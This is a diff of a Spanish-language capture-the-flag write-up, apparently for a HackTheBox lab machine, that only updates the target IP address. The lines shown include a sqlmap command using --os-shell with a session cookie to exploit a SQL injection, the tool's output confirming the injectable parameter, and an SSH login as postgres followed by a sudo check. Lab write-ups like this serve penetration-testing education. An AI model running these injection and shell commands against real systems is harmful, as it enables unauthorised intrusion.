@@ -153,7 +153,7 @@ Force 	Sedan 	Petrol 	600cc
 Así que lanzamos sqlmap y vemos si conseguimos ejecutar el  ```--os-shell```
 ``` shell
 ┌──(kali㉿kali25)-[~]
-└─$ sqlmap -u http://10.129.95.174/dashboard.php?search=MegaCorp --os-shell --flush-session --cookie="PHPSESSID=6vf4v6ojpk569pc630g0l416ea"
+└─$ sqlmap -u http://10.129.243.181/dashboard.php?search=MegaCorp --os-shell --flush-session --cookie="PHPSESSID=6vf4v6ojpk569pc630g0l416ea"
 [21:52:34] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
 GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
@@ -218,8 +218,8 @@ No podemos pedir usar vi con este terminal proporcionado por sqlmap, así que no
 
 ``` shell
 ┌──(kali㉿kali25)-[~]
-└─$ ssh postgres@10.129.95.174
-postgres@10.129.95.174's password: 
+└─$ ssh postgres@10.129.243.181
+postgres@10.129.243.181's password: 
 Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
 postgres@vaccine:~$ sudo -l
 [sudo] password for postgres: 
